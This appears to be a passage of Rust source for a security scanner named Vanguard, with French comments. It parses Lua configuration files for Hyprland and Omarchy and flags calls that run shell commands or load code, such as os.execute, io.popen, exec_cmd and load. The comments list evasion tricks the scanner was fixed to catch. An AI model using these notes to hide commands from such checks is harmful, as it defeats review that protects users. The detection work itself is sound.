/// Un jeton d'un texte Lua : un nom (mot-clé compris ; ses parties jointes par « . » : « o.bind », « o:bind » et
/// `o["bind"]` valent « o.bind »), une chaîne (son contenu décodé comme Lua le décode), ou un autre signe.
#[derive(Debug, Clone, PartialEq)]
enum JetonLua {
    Nom(String),
    Chaine(String),
    Signe(String),
}

/// Le niveau d'une longue parenthèse Lua qui s'ouvre en `i` (« [[ » : 0, « [==[ » : 2), et où commence son contenu.
fn longue_ouverte(c: &[char], i: usize) -> Option<(usize, usize)> {
    if c.get(i) != Some(&'[') {
        return None;
    }
    let mut j = i.checked_add(1)?;
    while c.get(j) == Some(&'=') {
        j = j.checked_add(1)?;
    }
    (c.get(j) == Some(&'[')).then(|| (j.saturating_sub(i).saturating_sub(1), j.saturating_add(1)))
}

/// Lit une longue chaîne ou un long commentaire de `niveau` à partir de `i` : son contenu (le premier retour à la
/// ligne sauté, comme Lua), où elle finit, combien de lignes elle traverse. Non fermée : jusqu'à la fin.
fn longue_lue(c: &[char], mut i: usize, niveau: usize) -> (String, usize, usize) {
    let mut contenu = String::new();
    let mut lignes = 0_usize;
    if c.get(i) == Some(&'\r') {
        i = i.saturating_add(1);
    }
    if c.get(i) == Some(&'\n') {
        i = i.saturating_add(1);
        lignes = 1;
    }
    while let Some(&x) = c.get(i) {
        if x == ']' {
            let egal = c
                .get(i.saturating_add(1)..)
                .unwrap_or_default()
                .iter()
                .take_while(|y| **y == '=')
                .count();
            if egal == niveau && c.get(i.saturating_add(1).saturating_add(egal)) == Some(&']') {
                return (contenu, i.saturating_add(2).saturating_add(egal), lignes);
            }
        }
        if x == '\n' {
            lignes = lignes.saturating_add(1);
        }
        contenu.push(x);
        i = i.saturating_add(1);
    }
    (contenu, i, lignes)
}

/// Les jetons d'un texte Lua, chacun avec le numéro de sa ligne (à partir de 0) ; commentaires (« -- », « --[[ ]] »,
/// « --[==[ ]==] ») sautés, chaînes décodées (« \n », « \ddd », « \xHH », « \u{…} », « \z » ; relecture adverse,
/// B4), noms joints (`JetonLua`). Une chaîne qui ne se ferme pas finit à la fin de sa ligne (Lua refuserait le
/// fichier). Une fin de ligne est, comme pour Lua, « \n », « \r », « \r\n » ou « \n\r » (vérification 2, N9 : un
/// « -- » fini par un retour chariot seul cachait l'appel qui le suit).
fn jetons_lua(texte: &str) -> Vec<(JetonLua, usize)> {
    // Comme luaL_loadfilex (vérification 3, H4) : une marque d'ordre des octets ôtée, puis une 1re ligne qui commence
    // par « # » sautée jusqu'à sa fin (son « \n » gardé pour compter les lignes) ; sinon un « --[[ » écrit dessus
    // cacherait à Vanguard les lignes que Lua exécute.
    let texte = texte.strip_prefix('\u{feff}').unwrap_or(texte);
    let texte = if texte.starts_with('#') {
        texte
            .find(['\n', '\r'])
            .map_or("", |i| texte.get(i..).unwrap_or_default())
    } else {
        texte
    };
    let mut c: Vec<char> = Vec::with_capacity(texte.len());
    let mut lettres = texte.chars().peekable();
    while let Some(x) = lettres.next() {
        if x == '\r' || x == '\n' {
            lettres.next_if_eq(&if x == '\n' { '\r' } else { '\n' });
            c.push('\n');
        } else {
            c.push(x);
        }
    }
    let mut jetons: Vec<(JetonLua, usize)> = Vec::new();
    let mut ligne = 0_usize;
    let mut i = 0_usize;
    while let Some(&x) = c.get(i) {
        let suivant = c.get(i.saturating_add(1)).copied();
        if x == '\n' {
            ligne = ligne.saturating_add(1);
            i = i.saturating_add(1);
        } else if x.is_whitespace() {
            i = i.saturating_add(1);
        } else if x == '-' && suivant == Some('-') {
            let debut = i.saturating_add(2);
            if let Some((niveau, contenu)) = longue_ouverte(&c, debut) {
                let (_, fin, lignes) = longue_lue(&c, contenu, niveau);
                ligne = ligne.saturating_add(lignes);
                i = fin;
            } else {
                i = debut;
                while c.get(i).is_some_and(|y| *y != '\n') {
                    i = i.saturating_add(1);
                }
            }
        } else if let Some((niveau, contenu)) = longue_ouverte(&c, i) {
            let (chaine, fin, lignes) = longue_lue(&c, contenu, niveau);
            jetons.push((JetonLua::Chaine(chaine), ligne));
            ligne = ligne.saturating_add(lignes);
            i = fin;
        } else if x == '"' || x == '\'' {
            let debut = ligne;
            let mut octets: Vec<u8> = Vec::new();
            i = i.saturating_add(1);
            while let Some(&y) = c.get(i) {
                i = i.saturating_add(1);
                if y == x || y == '\n' {
                    if y == '\n' {
                        ligne = ligne.saturating_add(1);
                    }
                    break;
                }
                if y != '\\' {
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(y.encode_utf8(&mut tampon).as_bytes());
                    continue;
                }
                let Some(&e) = c.get(i) else { break };
                i = i.saturating_add(1);
                let simple = match e {
                    'a' => Some(7),
                    'b' => Some(8),
                    'f' => Some(12),
                    'n' | '\n' => Some(b'\n'),
                    'r' => Some(b'\r'),
                    't' => Some(b'\t'),
                    'v' => Some(11),
                    _ => None,
                };
                if e == '\n' {
                    ligne = ligne.saturating_add(1);
                }
                if let Some(o) = simple {
                    octets.push(o);
                } else if e == 'z' {
                    while let Some(&b) = c.get(i).filter(|b| b.is_whitespace()) {
                        if b == '\n' {
                            ligne = ligne.saturating_add(1);
                        }
                        i = i.saturating_add(1);
                    }
                } else if e == 'x' {
                    let hex: String = c.get(i..).unwrap_or_default().iter().take(2).collect();
                    if let Ok(o) = u8::from_str_radix(&hex, 16) {
                        octets.push(o);
                        i = i.saturating_add(2);
                    }
                } else if e.is_ascii_digit() {
                    let mut valeur = e.to_digit(10).unwrap_or(0);
                    for _ in 0..2 {
                        let Some(d) = c.get(i).and_then(|d| d.to_digit(10)) else {
                            break;
                        };
                        valeur = valeur.saturating_mul(10).saturating_add(d);
                        i = i.saturating_add(1);
                    }
                    octets.push(u8::try_from(valeur).unwrap_or(u8::MAX));
                } else if e == 'u' && c.get(i) == Some(&'{') {
                    let hex: String = c
                        .get(i.saturating_add(1)..)
                        .unwrap_or_default()
                        .iter()
                        .take_while(|h| h.is_ascii_hexdigit())
                        .collect();
                    i = i.saturating_add(1).saturating_add(hex.len());
                    if c.get(i) == Some(&'}') {
                        i = i.saturating_add(1);
                    }
                    let lettre = u32::from_str_radix(&hex, 16)
                        .ok()
                        .and_then(char::from_u32)
                        .unwrap_or('\u{fffd}');
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(lettre.encode_utf8(&mut tampon).as_bytes());
                } else {
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(e.encode_utf8(&mut tampon).as_bytes());
                }
            }
            jetons.push((JetonLua::Chaine(String::from_utf8_lossy(&octets).into_owned()), debut));
        } else if x.is_alphabetic() || x == '_' {
            let mut nom = String::new();
            while let Some(&y) = c.get(i).filter(|y| y.is_alphanumeric() || **y == '_') {
                nom.push(y);
                i = i.saturating_add(1);
            }
            jetons.push((JetonLua::Nom(nom), ligne));
        } else if x.is_ascii_digit() || (x == '.' && suivant.is_some_and(|s| s.is_ascii_digit())) {
            let mut nombre = String::new();
            while let Some(&y) = c.get(i).filter(|y| y.is_ascii_alphanumeric() || **y == '.') {
                if y == '.' && c.get(i.saturating_add(1)) == Some(&'.') {
                    break;
                }
                nombre.push(y);
                i = i.saturating_add(1);
            }
            jetons.push((JetonLua::Signe(nombre), ligne));
        } else {
            let deux: String = c.get(i..).unwrap_or_default().iter().take(3).collect();
            let signe = ["...", "..", "==", "~=", "<=", ">=", "::", "//", "<<", ">>"]
                .into_iter()
                .find(|s| deux.starts_with(s))
                .map_or_else(|| x.to_string(), str::to_string);
            i = i.saturating_add(signe.chars().count());
            jetons.push((JetonLua::Signe(signe), ligne));
        }
    }
    // Les noms joints : « a.b », « a:b » et « a["b"] » (relecture adverse, B4 : « hl.dsp.exec_cmd »).
    let mut joints: Vec<(JetonLua, usize)> = Vec::with_capacity(jetons.len());
    let mut k = 0_usize;
    while let Some((jeton, l)) = jetons.get(k).cloned() {
        let precedent = joints.last_mut().and_then(|(j, _)| match j {
            JetonLua::Nom(n) => Some(n),
            _ => None,
        });
        let apres = |d: usize| jetons.get(k.saturating_add(d)).map(|(j, _)| j);
        if let Some(nom) = precedent {
            let point = matches!(&jeton, JetonLua::Signe(s) if s == "." || s == ":");
            if point && let Some(JetonLua::Nom(suite)) = apres(1) {
                nom.push('.');
                nom.push_str(suite);
                k = k.saturating_add(2);
                continue;
            }
            let crochet = matches!(&jeton, JetonLua::Signe(s) if s == "[");
            if crochet
                && let (Some(JetonLua::Chaine(suite)), Some(JetonLua::Signe(fin))) = (apres(1), apres(2))
                && fin == "]"
            {
                nom.push('.');
                nom.push_str(suite);
                k = k.saturating_add(3);
                continue;
            }
        }
        joints.push((jeton, l));
        k = k.saturating_add(1);
    }
    joints
}

/// Les mots-clés de Lua : jamais des noms de variable ni de fonction.
const MOTS_CLES_LUA: [&str; 22] = [
    "and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil",
    "not", "or", "repeat", "return", "then", "true", "until", "while",
];

/// Ce que fait un appel Lua nommé `nom` (relecture adverse, B4) : lancer une commande ou charger du code lu ailleurs.
#[derive(Debug, Clone, Copy, PartialEq)]
enum AppelLua {
    /// « exec_cmd », « exec_raw », « launch », « exec_on_start »…, « os.execute », « io.popen », « hl.plugin.load » :
    /// chaque argument est une commande (ou un greffon) ; un argument qui ne se lit pas est dit.
    Lance,
    /// Un raccourci (« bind », « bind_hold », « rebind ») : chaque chaîne se juge ; une fonction donnée en argument
    /// se lit pour elle-même ; un argument qui ne se lit pas est dit.
    Raccourci,
    /// « dofile », « loadfile » : un chemin écrit en toutes lettres se juge et doit mener à un fichier lu ; un chemin
    /// calculé ne se lit pas (« os.getenv("OMARCHY_PATH") or … », la forme du modèle d'Omarchy, vaut sa valeur par
    /// défaut : OMARCHY_PATH se juge là où il se pose).
    Fichier,
    /// « require » : un nom calculé est dit ; un nom écrit doit mener à un module lu (`module_hors_lecture`).
    Module,
    /// « load », « loadstring », « package.loadlib », « rawget », « rawset », « debug.setlocal »… : du code, une
    /// fonction ou une valeur qui ne se voit pas.
    Code,
}

/// La sorte d'un nom Lua (« _G. » et « _ENV. » ôtés), ou `None`.
fn appel_lua(nom: &str) -> Option<AppelLua> {
    let nom = nom.trim_start_matches("_G.").trim_start_matches("_ENV.");
    let fin = nom.rsplit('.').next().unwrap_or(nom);
    if nom.ends_with("plugin.load")
        || [
            "exec_cmd",
            "exec_raw",
            "exec_once",
            "exec_on_start",
            "launch",
            "launch_on_start",
            "execute",
            "popen",
            // Aides d'Omarchy (default/hypr/helpers.lua) qui lancent ou rendent une commande (vérification 2, N9).
            "shell_succeeds",
            "launch_sole",
            "launch_webapp",
            "launch_webapp_sole",
        ]
        .contains(&fin)
    {
        Some(AppelLua::Lance)
    } else if fin == "bind" || fin == "rebind" || fin.starts_with("bind_") {
        Some(AppelLua::Raccourci)
    } else if nom == "dofile" || nom == "loadfile" {
        Some(AppelLua::Fichier)
    } else if nom == "require" {
        Some(AppelLua::Module)
    } else if [
        "load",
        "loadstring",
        "loadlib",
        "rawget",
        "rawset",
        "setfenv",
        "setlocal",
        "setupvalue",
        "upvaluejoin",
    ]
    .contains(&fin)
    {
        Some(AppelLua::Code)
    } else {
        None
    }
}

/// Un appel Lua qui lance ou charge (`appels_lua`) : sa première et sa dernière ligne (à partir de 0), ses
/// commandes lues en toutes lettres, et pourquoi il n'est pas lu en entier s'il ne l'est pas.
#[derive(Debug, PartialEq)]
struct AppelLu {
    debut: usize,
    fin: usize,
    commandes: Vec<String>,
    /// Ce qui se lit sans être une ligne de shell (touches et description d'un raccourci, chemin d'un « dofile ») :
    /// ses seuls mots jugés.
    textes: Vec<String>,
    /// Les noms écrits d'un « require », les chemins écrits d'un « dofile » : où ils mènent se vérifie
    /// (`charge_hors_lecture`).
    modules: Vec<String>,
    fichiers: Vec<String>,
    non_lu: Option<&'static str>,
}

/// La raison d'un appel Lua de lancement dont la commande ne se lit pas en toutes lettres.
fn commande_lua_non_lue() -> &'static str {
    tr!(
        "commande Lua que Vanguard ne lit pas en toutes lettres (variable, calcul ou fonction) : ce qu'elle lance n'est pas vérifié",
        "Lua command Vanguard cannot read spelled out (variable, computation or function): what it starts is not checked"
    )
}

/// La raison d'un code Lua chargé que Vanguard ne lit pas.
fn code_lua_non_lu() -> &'static str {
    tr!(
        "code Lua chargé d'une chaîne, d'une bibliothèque, d'un nom calculé ou d'un chemin de modules changé (load, package.loadlib, require, package.path) : non vérifié",
        "Lua code loaded from a string, a library, a computed name or a changed module path (load, package.loadlib, require, package.path): not checked"
    )
}

/// La raison d'une fonction Lua qui lance, renommée ou redéfinie.
fn fonction_lua_renommee() -> &'static str {
    tr!(
        "fonction Lua qui lance une commande, renommée ou redéfinie : ce qu'elle lance ne se voit pas",
        "Lua function that starts a command, renamed or redefined: what it starts cannot be seen"
    )
}

/// Où se ferme le groupe ouvert en `i` (« ( », « { », « [ »), bloc « function … end » compris, ou la fin.
fn fermeture_lua(jetons: &[(JetonLua, usize)], i: usize) -> usize {
    let mut profondeur = 0_i64;
    let mut k = i;
    while let Some((j, _)) = jetons.get(k) {
        match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => profondeur = profondeur.saturating_add(1),
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => {
                profondeur = profondeur.saturating_sub(1);
                if profondeur <= 0 {
                    return k;
                }
            }
            _ => {}
        }
        k = k.saturating_add(1);
    }
    jetons.len().saturating_sub(1)
}

/// Les éléments d'une liste Lua (arguments d'un appel, champs d'une table), coupée sur « , » et « ; » hors des
/// groupes et des blocs « function … end ».
fn elements_lua(jetons: &[(JetonLua, usize)]) -> Vec<&[(JetonLua, usize)]> {
    let mut elements = Vec::new();
    let (mut groupes, mut blocs) = (0_i64, 0_i64);
    let mut debut = 0_usize;
    for (k, (j, _)) in jetons.iter().enumerate() {
        match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => groupes = groupes.saturating_add(1),
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => groupes = groupes.saturating_sub(1),
            JetonLua::Nom(n) if ["function", "do", "if", "repeat"].contains(&n.as_str()) => {
                blocs = blocs.saturating_add(1);
            }
            JetonLua::Nom(n) if n == "end" || n == "until" => blocs = blocs.saturating_sub(1),
            JetonLua::Signe(s) if (s == "," || s == ";") && groupes == 0 && blocs == 0 => {
                elements.push(jetons.get(debut..k).unwrap_or_default());
                debut = k.saturating_add(1);
            }
            _ => {}
        }
    }
    let reste = jetons.get(debut..).unwrap_or_default();
    if !reste.is_empty() {
        elements.push(reste);
    }
    elements
}

/// Les valeurs posées dans un fichier Lua pour chaque nom (« local x = "…" », « x = a .. "…" »), toutes (sans
/// ordre : une fonction appelée plus tard voit la dernière) ; `None` dans la liste : une valeur que Vanguard ne lit
/// pas (relecture adverse, B4 : « local terminal = … » puis « exec_cmd(terminal) », l'exemple de Hyprland).
type LocalesLua = std::collections::BTreeMap<String, Vec<Option<String>>>;

/// « os.getenv("OMARCHY_PATH") or x » : x, la valeur par défaut, comme dans le modèle d'Omarchy (`AppelLua::Fichier`) ;
/// OMARCHY_PATH se juge là où il se pose (`variable_d_injection`). Toute autre expression, telle quelle.
fn defaut_d_omarchy(jetons: &[(JetonLua, usize)]) -> &[(JetonLua, usize)] {
    match jetons {
        [
            (JetonLua::Nom(f), _),
            (JetonLua::Signe(a), _),
            (JetonLua::Chaine(v), _),
            (JetonLua::Signe(b), _),
            (JetonLua::Nom(ou), _),
            reste @ ..,
        ] if f == "os.getenv" && a == "(" && v == "OMARCHY_PATH" && b == ")" && ou == "or" => reste,
        _ => jetons,
    }
}

/// Un nom Lua sans « _G. » ni « _ENV. » devant : « _G.c » est le global « c ».
fn nom_global(nom: &str) -> &str {
    let mut n = nom;
    while let Some(reste) = n.strip_prefix("_G.").or_else(|| n.strip_prefix("_ENV.")) {
        n = reste;
    }
    n
}

/// Les formes d'une expression Lua faite de chaînes, de noms posés (`LocalesLua`), de « os.getenv("HOME") » (lu
/// « $HOME ») et de « .. », parenthèses comprises ; `None` si l'une de ses parties ne se lit pas, ou trop de formes.
fn valeurs_lua(jetons: &[(JetonLua, usize)], locales: &LocalesLua) -> Option<Vec<String>> {
    let mut formes = vec![String::new()];
    let mut k = 0_usize;
    loop {
        let suite: Vec<String> = match jetons.get(k).map(|(j, _)| j) {
            Some(JetonLua::Chaine(s)) => {
                k = k.saturating_add(1);
                vec![s.clone()]
            }
            Some(JetonLua::Signe(s)) if s == "(" => {
                let fin = fermeture_lua(jetons, k);
                let dedans = valeurs_lua(defaut_d_omarchy(jetons.get(k.saturating_add(1)..fin)?), locales)?;
                k = fin.saturating_add(1);
                dedans
            }
            Some(JetonLua::Nom(n)) if n == "os.getenv" => {
                let (Some(JetonLua::Signe(ouvre)), Some(JetonLua::Chaine(nom)), Some(JetonLua::Signe(ferme))) = (
                    jetons.get(k.saturating_add(1)).map(|(j, _)| j),
                    jetons.get(k.saturating_add(2)).map(|(j, _)| j),
                    jetons.get(k.saturating_add(3)).map(|(j, _)| j),
                ) else {
                    return None;
                };
                // Seul HOME se connaît : la valeur d'une autre variable entre telle quelle dans la ligne de shell
                // (vérification 2, N9 : « os.getenv("ZZ") .. "/agent" » se lisait « $ZZ/agent »).
                if ouvre != "(" || ferme != ")" || nom != "HOME" {
                    return None;
                }
                k = k.saturating_add(4);
                vec!["$HOME".to_string()]
            }
            Some(JetonLua::Nom(n)) if !MOTS_CLES_LUA.contains(&n.as_str()) => {
                k = k.saturating_add(1);
                locales
                    .get(nom_global(n))?
                    .iter()
                    .cloned()
                    .collect::<Option<Vec<String>>>()?
            }
            _ => return None,
        };
        formes = formes
            .iter()
            .flat_map(|f| suite.iter().map(move |s| format!("{f}{s}")))
            .collect();
        if formes.len() > FORMES_MAX {
            return None;
        }
        match jetons.get(k).map(|(j, _)| j) {
            None => return Some(formes),
            Some(JetonLua::Signe(s)) if s == ".." => k = k.saturating_add(1),
            Some(_) => return None,
        }
    }
}

/// Un élément Lua qui ne lance rien par lui-même : un nombre, « true », « false », « nil », un bloc
/// « function … end » (ses appels se lisent pour eux-mêmes) ou un appel d'un répartiteur (« hl.dsp.… »).
fn element_sans_commande(jetons: &[(JetonLua, usize)]) -> bool {
    match jetons.first().map(|(j, _)| j) {
        Some(JetonLua::Nom(n)) if n == "function" => true,
        Some(JetonLua::Nom(n)) if ["true", "false", "nil"].contains(&n.as_str()) => jetons.len() == 1,
        Some(JetonLua::Nom(n)) if n.starts_with("hl.dsp.") && appel_lua(n) != Some(AppelLua::Lance) => true,
        Some(JetonLua::Nom(n)) if appel_lua(n) == Some(AppelLua::Lance) => {
            // Un appel, entier : ses commandes se lisent pour lui-même.
            matches!(jetons.get(1).map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "(")
                && fermeture_lua(jetons, 1) == jetons.len().saturating_sub(1)
        }
        // Un nombre (« 5 », « .5 ») ; pas « ... », les arguments d'une fonction (vérification 2, N9).
        Some(JetonLua::Signe(s)) => {
            let mut lettres = s.chars();
            jetons.len() == 1
                && match lettres.next() {
                    Some('.') => lettres.next().is_some_and(|c| c.is_ascii_digit()),
                    Some(c) => c.is_ascii_digit(),
                    None => false,
                }
        }
        _ => false,
    }
}

/// Une table de raccourci d'Omarchy (« { menu = "power" } », « { launch = "x", focus = "^x$" } ») : la commande
/// qu'en fait Omarchy (`command_from` de helpers.lua), champ prioritaire d'abord, les valeurs entre guillemets simples
/// comme `shell_quote`. Un motif (« focus ») ou un nom de menu n'est pas une commande : lu champ par champ, il ne
/// passerait pas la liste permise (vérification 3). `None` pour un champ qui n'est pas d'Omarchy, répété ou illisible :
/// la table se lit alors champ par champ.
fn table_d_omarchy(dedans: &[(JetonLua, usize)], locales: &LocalesLua) -> Option<Vec<String>> {
    const CHAMPS: [&str; 11] = [
        "omarchy",
        "menu",
        "panel",
        "audio",
        "brightness",
        "ipc",
        "focus",
        "launch",
        "webapp",
        "tui",
        "description",
    ];
    let mut champs: std::collections::BTreeMap<&str, Vec<String>> = std::collections::BTreeMap::new();
    for champ in elements_lua(dedans) {
        let (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(e))) =
            (champ.first().map(|(j, _)| j), champ.get(1).map(|(j, _)| j))
        else {
            return None;
        };
        let nom = CHAMPS.iter().find(|c| **c == n.as_str())?;
        let valeur = champ.get(2..).unwrap_or_default();
        let formes = match valeur {
            [(JetonLua::Nom(v), _)] if v == "true" && *nom == "focus" => vec!["true".to_string()],
            _ => valeurs_lua(valeur, locales)?,
        };
        if e != "=" || champs.insert(nom, formes).is_some() {
            return None;
        }
    }
    let q = |v: &str| format!("'{}'", v.replace('\'', "'\\''"));
    let chacun = |cle: &str, f: &dyn Fn(&str) -> Option<String>| -> Option<Vec<String>> {
        champs.get(cle)?.iter().map(|v| f(v)).collect()
    };
    let lues = if let Some(l) = chacun("omarchy", &|v| Some(format!("omarchy-launch-{v}"))) {
        l
    } else if let Some(l) = chacun("menu", &|v| Some(format!("omarchy-menu toggle {}", q(v)))) {
        l
    } else if let Some(l) = chacun("panel", &|v| Some(format!("omarchy-shell shell toggle {}", q(v)))) {
        l
    } else if let Some(l) = chacun("audio", &|v| Some(format!("omarchy-audio-output-volume {}", q(v)))) {
        l
    } else if let Some(l) = chacun("brightness", &|v| {
        Some(format!(
            "omarchy-brightness-display {}",
            if v == "raise" { "+5%" } else { "5%-" }
        ))
    }) {
        l
    } else if champs.contains_key("ipc") {
        // « cible.méthode » ; sans point, Lua s'arrête sur une erreur : rien ne se lance, mais la table se lit à part.
        chacun("ipc", &|v| {
            let (cible, methode) = v.split_once('.')?;
            (!cible.is_empty() && !methode.is_empty()).then(|| format!("omarchy-shell {} {}", q(cible), q(methode)))
        })?
    } else if let (Some(motifs), Some(l)) = (champs.get("focus"), champs.get("launch")) {
        motifs
            .iter()
            .flat_map(|m| l.iter().map(move |c| (m, c)))
            .map(|(m, c)| format!("omarchy-launch-or-focus {} {}", q(m), q(&format!("uwsm-app -- {c}"))))
            .collect()
    } else if let Some(l) = chacun("launch", &|v| Some(format!("uwsm-app -- {v}"))) {
        l
    } else if champs.contains_key("webapp") {
        // Avec « focus », le nom de la fenêtre est la description du raccourci : du texte, que la commande cite.
        chacun("webapp", &|v| Some(format!("omarchy-launch-webapp {}", q(v))))?
    } else if champs.contains_key("focus") {
        chacun("tui", &|v| Some(format!("omarchy-launch-or-focus-tui {}", q(v))))?
    } else {
        chacun("tui", &|v| Some(format!("omarchy-launch-tui {}", q(v))))?
    };
    (lues.len() <= FORMES_MAX).then_some(lues)
}

/// Lit un élément d'un appel qui lance (`AppelLua::Lance`, `AppelLua::Raccourci`) : ses commandes en toutes lettres
/// dans `commandes` ; faux s'il ne se lit pas. Une table se lit champ par champ.
fn element_lu(jetons: &[(JetonLua, usize)], locales: &LocalesLua, commandes: &mut Vec<String>) -> bool {
    if element_sans_commande(jetons) {
        return true;
    }
    if matches!(jetons.first().map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "{")
        && fermeture_lua(jetons, 0) == jetons.len().saturating_sub(1)
    {
        let dedans = jetons.get(1..jetons.len().saturating_sub(1)).unwrap_or_default();
        if let Some(lues) = table_d_omarchy(dedans, locales) {
            commandes.extend(lues);
            return true;
        }
        return elements_lua(dedans).into_iter().all(|champ| {
            // « nom = valeur » et « [clé] = valeur » : la valeur.
            let valeur = match (champ.first().map(|(j, _)| j), champ.get(1).map(|(j, _)| j)) {
                // La description d'un raccourci (« { description = "…" } ») ne se lance pas.
                (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(s))) if s == "=" && n == "description" => return true,
                // « { omarchy = "x" } » d'Omarchy lance « omarchy-launch-x », sans guillemets autour de « x »
                // (helpers.lua, command_from ; vérification 2, N9).
                (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(s))) if s == "=" && n == "omarchy" => {
                    let mut lues = Vec::new();
                    let lu = element_lu(champ.get(2..).unwrap_or_default(), locales, &mut lues);
                    commandes.extend(lues.into_iter().map(|c| format!("omarchy-launch-{c}")));
                    return lu;
                }
                (Some(JetonLua::Nom(_)), Some(JetonLua::Signe(s))) if s == "=" => champ.get(2..).unwrap_or_default(),
                (Some(JetonLua::Signe(s)), _) if s == "[" => {
                    let fin = fermeture_lua(champ, 0);
                    match champ.get(fin.saturating_add(1)).map(|(j, _)| j) {
                        Some(JetonLua::Signe(e)) if e == "=" => champ.get(fin.saturating_add(2)..).unwrap_or_default(),
                        _ => champ,
                    }
                }
                _ => champ,
            };
            element_lu(valeur, locales, commandes)
        });
    }
    match valeurs_lua(jetons, locales) {
        Some(formes) => {
            commandes.extend(formes);
            true
        }
        None => false,
    }
}

/// Vérification 3, point 4 : un élément d'un appel qui lance ne se lit que s'il est écrit en toutes lettres : des
/// chaînes (jointes par « .. »), des nombres, « true », « false », « nil », et des tables de champs nommés qui en
/// sont faites ; ou ce qu'`element_sans_commande` laisse aux appels lus pour eux-mêmes. Un nom posé ailleurs, un
/// « os.getenv », un autre appel ne se lisent pas : l'appel est levé « non lu », même si la valeur se retrouverait.
fn litterale_lua(jetons: &[(JetonLua, usize)]) -> bool {
    if element_sans_commande(jetons) {
        return true;
    }
    jetons.iter().enumerate().all(|(k, (j, _))| match j {
        JetonLua::Chaine(_) => true,
        JetonLua::Signe(s) => {
            matches!(s.as_str(), ".." | "(" | ")" | "{" | "}" | "," | ";" | "=")
                || s.chars().next().is_some_and(|c| c.is_ascii_digit())
        }
        JetonLua::Nom(n) => {
            ["true", "false", "nil"].contains(&n.as_str())
                || matches!(jetons.get(k.saturating_add(1)).map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "=")
        }
    })
}

/// Les valeurs posées pour chaque nom du fichier (`LocalesLua`) : « nom = valeur » au niveau des instructions (pas
/// un champ de table « { nom = … } », pas un argument), chaque nom d'une liste « a, b = … », d'une boucle « for » ou
/// des paramètres d'une fonction sans valeur lue ; une valeur faite d'autres noms relue tant qu'elle change (au plus
/// 8 fois) ; une valeur qui se nomme elle-même, un appel ou une fonction : non lue. Toutes les portées ensemble : un
/// nom vaut chacune de ses valeurs écrites, et n'importe quoi si l'une ne se lit pas.
fn locales_lua(jetons: &[(JetonLua, usize)]) -> LocalesLua {
    let signe = |k: usize, s: &str| matches!(jetons.get(k).map(|(j, _)| j), Some(JetonLua::Signe(x)) if x == s);
    let mut locales: LocalesLua = std::collections::BTreeMap::new();
    let mut a_relire: Vec<(String, usize, usize)> = Vec::new();
    // Les groupes ouverts : « ( », « { », « [ », et « B » pour un bloc (function, do, if, repeat).
    let mut ouverts: Vec<char> = Vec::new();
    for (k, (j, _)) in jetons.iter().enumerate() {
        let nom = match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => {
                ouverts.push(s.chars().next().unwrap_or('('));
                continue;
            }
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => {
                ouverts.pop();
                continue;
            }
            JetonLua::Nom(n) if ["function", "do", "if", "repeat"].contains(&n.as_str()) => {
                // Les paramètres d'une fonction (« function f(c) », « function(c) ») : liés à ce que l'appel donne
                // (vérification 2, N9 : « local function run(c) hl.exec_cmd(c) end » ne vaut pas la locale « c »).
                let mut p = k.saturating_add(1);
                if n == "function" && matches!(jetons.get(p).map(|(j, _)| j), Some(JetonLua::Nom(_))) {
                    p = p.saturating_add(1);
                }
                if n == "function" && signe(p, "(") {
                    let fin = fermeture_lua(jetons, p);
                    for (param, _) in jetons.get(p.saturating_add(1)..fin).unwrap_or_default() {
                        if let JetonLua::Nom(param) = param {
                            locales.entry(param.clone()).or_default().push(None);
                        }
                    }
                }
                ouverts.push('B');
                continue;
            }
            JetonLua::Nom(n) if n == "for" => {
                // Les variables d'une boucle (« for _, cmd in … », « for cmd in … », « for i = … ») : sans valeur lue.
                let mut p = k.saturating_add(1);
                while let Some((j, _)) = jetons.get(p) {
                    match j {
                        JetonLua::Nom(v) if !MOTS_CLES_LUA.contains(&v.as_str()) => {
                            locales.entry(v.clone()).or_default().push(None);
                        }
                        JetonLua::Signe(s) if s == "," => {}
                        _ => break,
                    }
                    p = p.saturating_add(1);
                }
                continue;
            }
            JetonLua::Nom(n) if n == "end" || n == "until" => {
                ouverts.pop();
                continue;
            }
            // « _G.c = … » pose le global « c ».
            JetonLua::Nom(n) if !MOTS_CLES_LUA.contains(&n.as_str()) => nom_global(n).to_string(),
            _ => continue,
        };
        if ouverts.last().is_some_and(|o| *o != 'B') {
            continue;
        }
        // Une liste de noms suivie de « = » ou de « in » : chaque nom sans valeur lue.
        let mut m = k;
        while signe(m.saturating_add(1), ",")
            && matches!(jetons.get(m.saturating_add(2)).map(|(j, _)| j), Some(JetonLua::Nom(_)))
        {
            m = m.saturating_add(2);
        }
        let apres_liste = |s: &str| signe(m.saturating_add(1), s);
        let precede_d_une_virgule = k.checked_sub(1).is_some_and(|p| signe(p, ","));
        if (m > k
            && (apres_liste("=")
                || matches!(jetons.get(m.saturating_add(1)).map(|(j, _)| j), Some(JetonLua::Nom(n)) if n == "in")))
            || (precede_d_une_virgule && signe(k.saturating_add(1), "="))
        {
            locales.entry(nom.clone()).or_default().push(None);
            continue;
        }
        if !signe(k.saturating_add(1), "=") {
            continue;
        }
        // La valeur : termes joints par « .. » (chaîne, nom, groupe, « os.getenv(…) »).
        let debut = k.saturating_add(2);
        let mut fin = debut;
        loop {
            match jetons.get(fin).map(|(j, _)| j) {
                Some(JetonLua::Signe(s)) if s == "(" => fin = fermeture_lua(jetons, fin).saturating_add(1),
                Some(JetonLua::Nom(n)) if n == "os.getenv" && signe(fin.saturating_add(1), "(") => {
                    fin = fermeture_lua(jetons, fin.saturating_add(1)).saturating_add(1);
                }
                Some(JetonLua::Nom(n)) if MOTS_CLES_LUA.contains(&n.as_str()) => break,
